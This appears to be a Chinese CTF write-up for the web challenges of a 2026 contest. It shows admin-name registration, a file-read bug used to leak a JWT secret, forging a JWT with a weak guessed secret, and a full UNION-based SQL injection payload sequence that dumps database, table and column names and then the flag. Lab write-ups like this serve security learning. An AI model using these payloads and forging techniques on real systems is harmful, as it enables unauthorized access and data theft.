---
title: 好靶场综合赛古法赛道web部分
date: 2026-07-23 20:22:57
tags:
---

# 知识共享

一个登录页面，先注册发现admin用户可以直接被注册

![image-20260723202433291](https://gitee.com/bobrocket/img/raw/master/image-20260723202433291.png)

在预览附件这样存在文件读取漏洞，我们直接读一下源码

```python
@app.route("/admin/reports/export")
@privileged_required
def export_report():
    return Path("/tmp/flag.txt").read_text(encoding="utf-8", errors="ignore")
```

`/admin/reports/export`路由由`privileged_required`装饰器保护，校验逻辑：

```python
def privileged_required(view_func):
    @wraps(view_func)
    def wrapped(*args, **kwargs):
        token = request.cookies.get("token")
        if not token:
            return "身份凭证无效", 401
        try:
            payload = jwt.decode(token, app.config["SECRET_KEY"], algorithms=["HS256"])
        except jwt.InvalidTokenError:
            return "身份凭证无效", 401
        if payload.get("username") == "bigbigone" and payload.get("password") == "littlelittletwo":
            return view_func(*args, **kwargs)
        return "权限不足", 401
    return wrapped
```

这里进行了JWT鉴权，要求用户名必须是bigbigone，密码必须是littlelittletwo，在源码中提到了SECRET_KEY但是并没有直接泄露而是从环境变量中获取的，下面我们尝试利用文件读取漏洞读取一下环境变量

![image-20260723203430752](https://gitee.com/bobrocket/img/raw/master/image-20260723203430752.png)

下面开始伪造

![image-20260723220229925](https://gitee.com/bobrocket/img/raw/master/image-20260723220229925.png)

带着这个token访问`/admin/reports/export`路由即可

# edusrc

进去是一个大学的信息门户登录页面，不能注册，也没有直接给出用户名密码

前端的js代码泄露了一个学号，我们直接登录

![image-20260724172004201](https://gitee.com/bobrocket/img/raw/master/image-20260724172004201.png)

没什么可以利用的功能，我们用dirsearch扫一下目录，发现了`/admin`路由，直接访问提示当前身份不能访问教务管理后台。

下面我们发现又是通过jwt鉴权，看看能不能伪造。密钥找不到也爆破不出来。

![image-20260724172445400](https://gitee.com/bobrocket/img/raw/master/image-20260724172445400.png)

试试弱口令

![image-20260724172532238](https://gitee.com/bobrocket/img/raw/master/image-20260724172532238.png)

密钥是yunsee，我们修改权限为admin，登录后台

![image-20260724175132772](https://gitee.com/bobrocket/img/raw/master/image-20260724175132772.png)

这里提示校内资源库有查询链路，我们得到api路由`/api/admin/resources/search?keyword=`

经过探测发现可以这样闭合

```
keyword=') --+
```

查库名

```
keyword=') union select database(),2,3,4,5,6,7 --+
```

查表名

```
keyword=') union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema='yunsee_portal' --+
```

查列

```
keyword=') union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name='sys_audit_config' --+
```

查询值

```
keyword=') union select 1,2,3,4,5,6,group_concat(flag) from yunsee_portal.sys_audit_config --+
```

![image-20260724180552493](https://gitee.com/bobrocket/img/raw/master/image-20260724180552493.png)
